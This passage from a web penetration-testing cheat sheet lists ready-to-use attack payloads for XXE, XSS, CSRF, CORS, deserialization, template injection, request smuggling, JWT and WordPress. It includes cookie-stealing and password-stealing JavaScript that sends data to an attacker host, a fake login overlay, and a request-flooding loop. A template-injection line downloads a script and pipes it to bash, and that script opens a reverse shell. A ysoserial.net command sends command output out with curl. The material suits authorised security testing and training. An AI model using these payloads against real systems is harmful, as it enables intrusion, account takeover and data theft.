  <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITYxxe SYSTEM "file:///etc/hostname" > ]>
  <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
  </svg>
  ```
- **XXE attacks via modified content type**<br/>
  For example, Content-Type: `application/x-www-form-urlencoded` -> `Content-Type: text/xml`

Manually testing for XXE vulnerabilities generally involves
- Testing for file retrieval
- Testing for blind XXE vulnerabilities
- Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document

**Notes**
- In an endpoint like "ping/pong" you might send a request to include xml
- Try to chain it with LFI for an RCE
- Basic payload
  ```xml
  <?xml version="1.0" encoding="UTF-8" ?>
  <!DOCTYPE writeup [<!ENTITY xxe SYSTEM "http://10.10.14.38/ping.php" >]>
  <writeup>&xxe;</writeup>
  ```


### <ins>Cross-site scripting (XSS)</ins>

#### <ins>Bookmarks</ins>
- [Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
- [Exploiting XSS via Markdown](https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8)
- [XSS to Exfiltrate Data from PDFs](https://medium.com/r3d-buck3t/xss-to-exfiltrate-data-from-pdfs-f5bbb35eaba7)
- [How to craft an XSS payload to create an admin user in WordPress](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/)

#### <ins>Resources</ins>
- [xsscrapy](https://github.com/DanMcInerney/xsscrapy)
  - [python3 version](https://github.com/L1NT/xsscrapy) 
- For blind XSS
  - [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
  - [XSS Hunter](https://xsshunter.com/)
- [AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)
- [Weaponised XSS payloads](https://github.com/hakluke/weaponised-XSS-payloads)
- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [XSS all the things](XSS%20all%20the%20things/) some payloads to find XSS in various places
- [JSCompress](https://jscompress.com/)

#### <ins>Bypasses</ins>
- https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)
- [JSFuck](http://www.jsfuck.com/)
- [Path Relative style sheet injection](https://portswigger.net/kb/issues/00200328_path-relative-style-sheet-import)
- [Shortest rXSS possible](https://brutelogic.com.br/blog/shortest-reflected-xss-possible/)
- If Privileges are required, see if you can chain the XSS with a [CSRF](#cross-site-request-forgery-csrf)

#### <ins>CSP</ins>
- [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/)
- [CSP Auditor](https://portswigger.net/bappstore/35237408a06043e9945a11016fcbac18)
- [CSP Bypass](https://github.com/PortSwigger/csp-bypass)

#### <ins>Blind XSS</ins>
- Insert a payload in the User-Agent, try with the match/replace rule
- Other endpoints: pending review comments, feedback

#### <ins>Swagger XSS</ins>
- https://github.com/swagger-api/swagger-ui/issues/1262
- https://github.com/swagger-api/swagger-ui/issues/3847<br/>
  `?url=https://raw.githubusercontent.com/seeu-inspace/easyg/main/XSS/swag-test.json`
- [Hacking Swagger-UI - from XSS to account takeovers](https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/)<br/>
  `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlZXUtaW5zcGFjZS9lYXN5Zy9tYWluL1hTUy9zd2FnLXRlc3QueWFtbCIKfQo=`
- Nuclei template `%USERPROFILE%\nuclei-templates\exposures\apis\swagger-api.yaml`

#### <ins>Carriage Return Line Feed (CRLF) injection</ins>
- `/%0D%0AX-XSS-Protection%3A%200%0A%0A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
- `/%E5%98%8D%E5%98%8AX-XSS-Protection%3A%200%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
- Nuclei template `%USERPROFILE%\nuclei-templates\vulnerabilities\generic\crlf-injection.yaml`

#### <ins>Payloads</ins>


- HTML injection
  - ```HTML
    <p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a><br/><img src=http://evil.com style="visibility:hidden">
    ```
  - ```HTML
    <div style="background-color:white;position:fixed;width:100%;height:100%;top:0px;left:0px;z-index:1000;margin: auto;padding: 10px;"><p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a></div>
    ```
- [For hidden inputs](https://portswigger.net/research/xss-in-hidden-input-fields): `accesskey="X" onclick="alert(1)"` then Press ALT+SHIFT+X on Windows / CTRL+ALT+X on OS X
- For **mobile applications**: try to use as a vector the name of the phone with a payload like `"/><script>alert(1)</script>`
- [XSS Without parentheses](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- iframe + base64 encoded SVG 
  ```HTML
  <iframe src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pgo8IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPgoKPHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogICA8cmVjdCB3aWR0aD0iMzAwIiBoZWlnaHQ9IjEwMCIgc3R5bGU9ImZpbGw6cmdiKDAsMCwyNTUpO3N0cm9rZS13aWR0aDozO3N0cm9rZTpyZ2IoMCwwLDApIiAvPgogICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CiAgICAgIGFsZXJ0KGRvY3VtZW50LmRvbWFpbik7CiAgIDwvc2NyaXB0Pgo8L3N2Zz4="></iframe>
  ```
- Small SVG base64
  ```HTML
  data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+
  ```
- Cookie stealers
  - ```JavaScript
    fetch('https://ATTACKER-WEBSITE', {method: 'POST',mode: 'no-cors',body:document.cookie});
    ```
  - ```JavaScript
    document.write('<img src=\"http://ATTACKER-WEBSITE/?cookie=' + document.cookie + '\" />')
    ```
  - ```HTML
    <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?x='+document.cookie;>
    ```
- Unusual events
  - `onpointerrawupdate` (Chrome only)
  - `onmouseleave`
- Can't use `alert`, `confirm` or `prompt`? Try `print()`! [[Reference](https://portswigger.net/research/alert-is-dead-long-live-print)]
- AngularJS
  - `{{$on.constructor('alert(1)')()}}`
- This lead the page to make a loop of requests, eventually causing being blocked by a WAF and being a potential DoS
  ```JavaScript
  for(;;){fetch('https://VICTIM/',{method:'GET'});}
  ```
- ```HTML
  data:text/javascript,console.log(3 + '\n' + `};console.log(1);//<img src=x onerror=javascript:console.log(2) oncopy=console.log(4)>`);//&quot; onerror=console.log(5) id=&quot;x
  ```
  - For the challenge [5Ways2XSS - DOJO #23 | YesWeHack](https://dojo-yeswehack.com/practice/d5e8e5ddf9af)
- [DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
  - `<iframe src="https://VICTIM.net/#" onload=this.src='http://ATTACKER/?x='+document.cookie;></iframe>`
  - `<iframe src="https://VICTIM.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
- [source 1](https://twitter.com/TakSec/status/1649091314842238978), [source 2](https://brutelogic.com.br/blog/alternative-javascript-pseudo-protocol/)
  ```HTML
  <a href=jav%26%23x61%3bscript:alert()>
  ```
- Steal values from inputs
  ```HTML
  <input name=username id=username>
  <input type=password name=password onchange="if(this.value.length)fetch('https://ATTACKER',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
  });">
  ```

**Misc payloads**
```HTML
" onload=alert() alt="
<img src=x onerror=alert()>
javascript:alert(document.cookie)
%253c%252fscript%253e%253cscript%253ealert(document.cookie)%253c%252fscript%253e
<a href="jAvAsCrIpT:alert(1)">payload</a>
%22%20onbeforeinput=alert(document.domain)%20contenteditable%20alt=%22
1672&81782%26apos%3b%3balert(%26apos%3bXSS%26apos%3b)%2f%2f232=1
<svg/onload=alert(0)>
<script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110))</script>
%22-alert(document.cookie)-%22
%00%22%3E%3Cimg%20src%3da%20onerror%3dconfirm(document.domain)%3E
<><img src=x onerror=alert()>
<body onresize=print() onload=this.style.width='100px'>
<xss id=x onfocus=alert(document.cookie) tabindex=1>
"><svg><animatetransform onbegin=alert(1)>
http://foo?&apos;-alert(1)-&apos;
${alert(1)}
```

#### <ins>XSS -> ATO Escalation</ins> [[Reference](https://twitter.com/Rhynorater/status/1682401924635566080)]
- Change email > Password reset
- Change phone number > SMS password reset
- Add SSO (Google, Github etc.)
- Add authentication method (email, sms etc.) > Password reset
- Change password
- Change security questions
- Cross Site Tracing: If cookies are protected by the HttpOnly flag but the TRACE method is enabled, a technique called Cross Site Tracing can be used. [[Reference](https://owasp.org/www-community/attacks/Cross_Site_Tracing)]
- Steal Cookies
- Steal API key
- Add admin user to the application
- Hijack oAuth flow and steal code
- Steal SSO code to adjacent app, then reverse SSO back to main app


### <ins>Cross-site request forgery (CSRF)</ins>

- Remove the entire token
- Use any random but same-length token, or `same-length+1`/`same-length-1`
- Use another user's token
- Change from `POST` to `GET` and delete the token
- If it's a `PUT` or `DELETE` request, try `POST /profile/update?_method=PUT` or
  ```HTTP
  POST /profile/update HTTP/1.1
  Host: vuln.com
  ...
  
  _method=PUT
  ```
- If the token it's in a custom header, delete the header
- Change the `Content-Type` to `application/json`, `application/x-url-encoded` or `form-multipart`, `text/html`, `application/xml`
- If there is double submit token, try CRLF injection
- Bypassing referrer check
  - If it's checked but only when it exists, add to the PoC `<meta name="referrer" content="never">` 
  - Regex Referral bypass
    ```
    - https://attacker.com?victim.com
    - https://attacker.com;victim.com
    - https://attacker.com/victim.com/../victimPATH
    - https://victim.com.attacker.com
    - https://attackervictim.com
    - https://victim.com@attacker.com
    - https://attacker.com#victim.com
    - https://attacker.com\.victim.com
    - https://attacker.com/.victim.com
    ```
- CSRF token stealing via XSS/HTMLi/CORS
- JSON based
  - Change the `Content-Type` to `text/plain`, `application/x-www-form-urlencoded`, `multipart/form-data`
  - Use flash + 307 redirect
- Guessable CSRF token
- Clickjacking to strong CSRF token bypass
- Type juggling
- Use array, from `csrf=token` to `csrf[]=token`
- Set the CSRF token to null or add null bytes
- Check whether CSRF token is sent over http or sent to 3rd party
- Generate multiple CSRF tokens, pick the static part. Play with the dynamic part

**Resources**
- [CSRF PoC Generator](https://security.love/CSRF-PoC-Genorator/)


### <ins>Cross-origin resource sharing (CORS)</ins>

**Classic CORS vulnerability**
```HTML
<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://<TARGET-URL>',true);
	req.withCredentials = true;
	req.send();
		
	function reqListener() {
		alert(this.responseText);
	};
</script>
```

**CORS vulnerability with null origin**
```HTML
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
		var req = new XMLHttpRequest();
		req.onload = reqListener;
		req.open('get','https://<TARGET-URL>',true);
		req.withCredentials = true;
		req.send();
		
		function reqListener() {
			alert(this.responseText);
		};
	</script>">
</iframe>
```


**Resources**
- [Corsy](https://github.com/s0md3v/Corsy) Corsy is a lightweight program that scans for all known misconfigurations in CORS implementations
- [What is CORS (cross-origin resource sharing)? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/cors)


### <ins>Clickjacking</ins>

**Classic PoC**
```HTML
<style>
  iframe {
    position:relative;
    width:$width_value;
    height: $height_value;
    opacity: $opacity;
    z-index: 2;
  }
  div {
    position:absolute;
    top:$top_value;
    left:$side_value;
    z-index: 1;
  }
</style>
<div>Click me button</div>
<iframe src="$url"></iframe>
```

**Resources**
- [What is Clickjacking? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/clickjacking)


### <ins>DOM-based vulnerabilities</ins>

Many DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data.

- document.URL
- document.documentURI
- document.URLUnencoded
- document.baseURI
- location
- document.cookie
- document.referrer
- window.name
- history.pushState
- history.replaceState
- localStorage
- sessionStorage
- IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
- Database

| DOM-based vulnerability          | Example sink               |
| -------------------------------- | -------------------------- |
| DOM XSS                          | document.write()           |
| Open redirection                 | window.location            |
| Cookie manipulation              | document.cookie            |
| JavaScript injection             | eval()                     |
| Document-domain manipulation     | document.domain            |
| WebSocket-URL poisoning          | WebSocket()                |
| Link manipulation                | someElement.src            |
| Web-message manipulation         | postMessage()              |
| Ajax request-header manipulation | setRequestHeader()         |
| Local file-path manipulation     | FileReader.readAsText()    |
| Client-side SQL injection        | ExecuteSql()               |
| HTML5-storage manipulation       | sessionStorage.setItem()   |
| Client-side XPath injection      | document.evaluate()        |
| Client-side JSON injection       | JSON.parse()               |
| DOM-data manipulation            | someElement.setAttribute() |
| Denial of service                | RegExp()                   |



### <ins>WebSockets</ins>

Any web security vulnerability might arise in relation to WebSockets:
- User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection;
- Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques;
- If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.

**Cross-site WebSocket hijacking (CSRF missing)**
```HTML
<script>
  websocket = new WebSocket('wss://websocket-URL');
  websocket.onopen = start;
  websocket.onmessage = handleReply;
  function start(event) {
    websocket.send("READY");
  }
  function handleReply(event) {
    fetch('https://your-domain/?'+event.data, {mode: 'no-cors'});
  }
</script>
```



### <ins>Insecure deserialization</ins>

How to spot Insecure deserialization
- PHP example
  `O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`
- Java objects always begin with the same bytes 
  - Hex `ac` `ed`
  - Base64 `rO0`
 - .NET vulnerable deserarilaztion libraries: BinaryFormatter, SoapFormatter, NetDataContractSerializer, LosFormatter, ObjectStateFormatter
 - BinaryFormatter serialized objects usually starts with `AAEAAAD`

**Ysoserial**

Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands. After some research, I found a way to run multiple sys commands anyway, by using `sh -c $@|sh . echo ` before the multiple commands that we need to run. Here I needed to run the command `host` and `whoami`:

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . echo host $(whoami).<MY-RATOR-ID>.burpcollaborator.net' | gzip | base64
```

Other options
- `java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 "id"`
  - See [this](https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f)

**Ysoserial.net**

Windows Defender might tag the application as virus.

```
.\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c 'whoami | curl --data-binary @- http://yourcollaboratorserver' -bgc ActivitySurrogateDisableTypeCheck --minify --ust
```

**PHPGGC**

[PHPGGC](https://github.com/ambionics/phpggc) is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically.

**Burp extensions**
- [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)
- [Java Serialized Payloads](https://portswigger.net/bappstore/bc737909a5d742eab91544705c14d34f)
- [GadgetProbe](https://portswigger.net/bappstore/e20cad259d73403bba5ac4e393a8583f)
- [Freddy, Deserialization Bug Finder](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3)
- [PHP Object Injection Check](https://portswigger.net/bappstore/24dab228311049d89a27a4d721e17ef7)



### <ins>Server-side template injection</ins>
- SSTI

- Try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`. To identify the template engine submit invalid syntax to cause an error message.
- The next step is look for the documentation to see how you can exploit the vulnerable endpoints and known vulnerabilities/exploits.
- Use payloads like these
  ```
  {{7*7}}[[3*3]]
  {{7*7}}
  {{7*'7'}}
  <%= 7 * 7 %>
  ${7*7}
  ${{7*7}}
  @(7+7)
  #{7*7}
  #{ 7 * 7 }
  ```
- test '{{7*7}}', if the result is 49, then we can proceed with more tests
- try then `{{config}}` and `{{{{{}.__class__.__base__.__subclasses__()}}}}`
- `python3 client.py '{{{}.__class__.__base__.__subclasses__()[400]("curl 192.168.45.237/shell.sh | bash", shell=True, stdout=-1).communicate()[0].decode()}}'`
  - shell.sh
    ```bash
    bash -i >& /dev/tcp/192.168.118.9/8080 0>&1
    ```


### <ins>Web cache poisoning</ins>

**Constructing a web cache poisoning attack**
 1. Identify and evaluate unkeyed inputs
 2. Elicit a harmful response from the back-end server
 3. Get the response cached

**Cache key flaws**
Many websites and CDNs perform various transformations on keyed components when they are saved in the cache key:
- Excluding the query string
- Filtering out specific query parameters
- Normalizing input in keyed components

**Cache probing methodology**<br/>
 1. Identify a suitable cache oracle
    - Simply a page or endpoint that provides feedback about the cache's behavior. This feedback could take various forms, such as: An HTTP header that explicitly tells you whether you got a cache hit, Observable changes to dynamic content, Distinct response times
 2. Probe key handling
    - Is anything being excluded from a keyed component when it is added to the cache key? Common examples are excluding specific query parameters, or even the entire query string, and removing the port from the Host header.
 3. Identify an exploitable gadget
    - These techniques enable you to exploit a number of unclassified vulnerabilities that are often dismissed as "unexploitable" and left unpatched.



### <ins>HTTP Host header attacks</ins>

- "If someone sends a cookie called '0', automattic.com responds with a list of all 152 cookies supported by the application:
curl -v -H 'Cookie: 0=1' https://automattic.com/?cb=123 | fgrep Cookie" [[Reference](https://hackerone.com/reports/310105)];
- Carriage Return Line Feed (CRLF) injection: "When you find response header injection, you can probably do better than mere XSS or open-redir. Try injecting a short Content-Length header to cause a reverse desync and exploit random live users." [[Reference](https://twitter.com/albinowax/status/1412778191119396864)]


### <ins>HTTP request smuggling</ins>

Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends:
- Content-Length
  ```HTTP
  POST /search HTTP/1.1
  Host: normal-website.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 11
  q=smuggling
  ```
- Transfer-Encoding
  ```HTTP
  POST /search HTTP/1.1
  Host: normal-website.com
  Content-Type: application/x-www-form-urlencoded
  Transfer-Encoding: chunked
  b
  q=smuggling
  0
  ```
  
Example
```HTTP
POST / HTTP/1.1
Host: smuggle-vulnerable.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Result: GPOST request
- Some servers do not support the Transfer-Encoding header in requests;
- Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.

Ways to obfuscate the Transfer-Encoding header
- `Transfer-Encoding: xchunked`
- `Transfer-Encoding : chunked`
- `Transfer-Encoding: chunked`
- `Transfer-Encoding: x`
- `Transfer-Encoding:[tab]chunked`
- `[space]Transfer-Encoding: chunked`
- `X: X[\n]Transfer-Encoding: chunked`
- ```
  Transfer-Encoding
  : chunked
  ```

Confirming CL.TE vulnerabilities using differential responses
```HTTP
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x


```

Result
```HTTP
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Impact
- Bypass front-end security controls
- Revealing front-end request rewriting
- Capturing other users' requests
- Using HTTP request smuggling to exploit reflected XSS
- Turn an on-site redirect into an open redirect<br/>
  Example of 301 in Apache and IIS web servers
  ```HTTP
  GET /home HTTP/1.1
  Host: normal-website.com
  HTTP/1.1 301 Moved Permanently
  Location: https://normal-website.com/home/
  ```
  Vulnerable request
  ```HTTP
  POST / HTTP/1.1
  Host: vulnerable-website.com
  Content-Length: 54
  Transfer-Encoding: chunked
  
  0
  
  GET /home HTTP/1.1
  Host: attacker-website.com
  Foo: X
  ```
  Result
  ```HTTP
  GET /home HTTP/1.1
  Host: attacker-website.com
  Foo: XGET /scripts/include.js HTTP/1.1
  Host: vulnerable-website.com
  HTTP/1.1 301 Moved Permanently
  Location: https://attacker-website.com/home/
  ```
- Perform web cache poisoning
- Perform web cache deception

**Resource**
- [HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)



### <ins>JWT Attacks</ins>

A JWT consists of a `header`, a `payload`, and a `signature`. Each part is separated by a dot.<br/>
 
Common attacks
- Accepting tokens with no signature
- Brute-forcing secret keys using [hashcat](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#how_do_i_install_hashcat)
  - You need a valid JWT and a [wordlist](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)
  - `hashcat -a 0 -m 16500 <jwt> <wordlist>`
  - If any of the signatures match, hashcat will give you an output like this `<jwt>:<identified-secret>` along with other details
  - Once identified the secret key, you can use it to generate a valid signature for any JWT header and payload that you like. See [Signing JWTs](https://portswigger.net/web-security/jwt/working-with-jwts-in-burp-suite#signing-jwts)
- Injecting self-signed JWTs via the `jwk`, `jku` or `kid` parameter
- Change Content-Type in `cty` to achieve XXE and deserialization attacks
- `x5c` (X.509 Certificate Chain) can lead to [CVE-2017-2800](https://talosintelligence.com/vulnerability_reports/TALOS-2017-0293) and [CVE-2018-2633](https://mbechler.github.io/2018/01/20/Java-CVE-2018-2633/)
- [JWT algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)

**Resources**
- [{JWT}.{Attack}.Playbook](https://github.com/ticarpi/jwt_tool/wiki)
  - [Checklist](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
- [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)



### <ins>OAuth authentication</ins>

How OAuth 2.0 works:
- `Client application` The website or web application that wants to access the user's data;
- `Resource owner` The user whose data the client application wants to access;
- `OAuth service provider` The website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server.

**[OAuth flow](https://portswigger.net/web-security/oauth/grant-types)**

<img src="img/oauth-authorization-code-flow.jpg" alt="oauth-flow">

Following standard endpoints:
- `/.well-known/oauth-authorization-server`
- `/.well-known/openid-configuration`

Vulnerabilities in the client application
- Improper implementation of the implicit grant type
- Flawed CSRF protection

Vulnerabilities in the OAuth service
- Leaking authorization codes and access tokens
- Flawed scope validation
- Unverified user registration



### <ins>GraphQL</ins>

To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangoncharov.github.io/graphql-voyager/) or [InQL](https://github.com/doyensec/inql) for Burp Suite.

**GraphQL Introspection query**

```JSON
{"query": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
```

```JSON
{query: __schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

```JSON
{"operationName":"IntrospectionQuery","variables":{},"query":"query IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n"}
```



### <ins>WordPress</ins>

- Information Disclosure [high]: `/_wpeprivate/config.json`
- Data exposure:
  - `/wp-json/wp/v2/users/`
  - `/wp-json/th/v1/user_generation`
  - `/?rest_route=/wp/v2/users`
- Register:
  - `http://192.168.157.166/wp-login.php?action=register`
  - `http://192.168.157.166/wp-signup.php`
- xmlrpc.php enabled, [reference](https://hackerone.com/reports/138869). Send a post request to this endpoint with a body like this:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
  </methodCall>
  ```
- Use [Nuclei](https://github.com/projectdiscovery/nuclei) to detect WordPress websites from a list of targets with: `nuclei -l subdomains.txt -t %USERPROFILE%/nuclei-templates/technologies/wordpress-detect.yaml`
- Scan with WPScan [github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan) with
  - `wpscan --url <domain> --enumerate u` enumerate users
  - `wpscan --url <domain> -U users.txt -P password.txt` try to find valid credentials
  - `wpscan --url <domain> --api-token <your-api-token>`
  - `wpscan --url <target> --enumerate p --plugins-detection aggressive -o results`
  - `wpscan --url https://example[.]com --api-token <api token> --plugins-detection mixed -e vp,vt,cb,dbe,u1-10 --force` [[source]](https://twitter.com/TakSec/status/1671202550844993543)
- Nuclei templates `%USERPROFILE%\nuclei-templates\vulnerabilities\wordpress`
- If you login as admin, you can achieve RCE
  - modify the theme in 'Appearance' > 'Theme Editor'
  - add `<?php exec("whoami")?>`
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
- Check `wp-config.php`
- Find outdated plugins and use searchsploit

**Resources**
- https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/WordPress.md
- https://www.rcesecurity.com/2022/07/WordPress-Transposh-Exploiting-a-Blind-SQL-Injection-via-XSS/
- [WordPress Checklist](https://github.com/pentesterzone/pentest-checklists/blob/master/CMS/WordPress-Checklist.md)



### <ins>IIS - Internet Information Services</ins>

- Check if `trace.axd` is enabled
- Search for
  ```
  Views/web.config
  bin/WebApplication1.dll
  System.Web.Mvc.dll
  System.Web.Mvc.Ajax.dll
  System.Web.Mvc.Html.dll
  System.Web.Optimization.dll
  System.Web.Routing.dll
  ```
- [Other common files](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#common-files)
- Microsoft IIS 6.0, many RCE and BoF
  - https://www.exploit-db.com/exploits/41738
  - `exploit/windows/iis/iis_webdav_scstoragepathfromurl`
- Tilde / shortname enumeration
  1. [200 expected] `curl --silent -v -X OPTIONS "http://10.10.10.93/idontexist*~.*" 2>&1 | grep "HTTP/1.1"`
  2. [404 expected] `curl --silent -v -X OPTIONS "http://10.10.10.93/aspnet~1.*" 2>&1 | grep "HTTP/1.1"`
  3. `java -jar /home/kali/Documents/web-attack/IIS-ShortName-Scanner/release/iis_shortname_scanner.jar 2 20 http://10.10.10.93 /home/kali/Documents/web-attack/IIS-ShortName-Scanner/release/config.xml`
- IIS file extensions https://learn.microsoft.com/en-us/previous-versions/2wawkw1c(v=vs.140)?redirectedfrom=MSDN


**Resources**
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
- Wordlist [iisfinal.txt](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#iis-discovery-bruteforce)

### <ins>Microsoft SharePoint</ins>

- Go to `http://target.com/_layouts/viewlsts.aspx` to see files shared / Site Contents

### <ins>Lotus Domino</ins>

- Find Lotus Domino with nuclei: `%USERPROFILE%\nuclei-templates\technologies\lotus-domino-version.yaml`
- Exploit DB: [Lotus-Domino](https://www.exploit-db.com/search?q=Lotus+Domino)
- Fuzzing list: [SecLists/LotusNotes.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/LotusNotes.fuzz.txt)



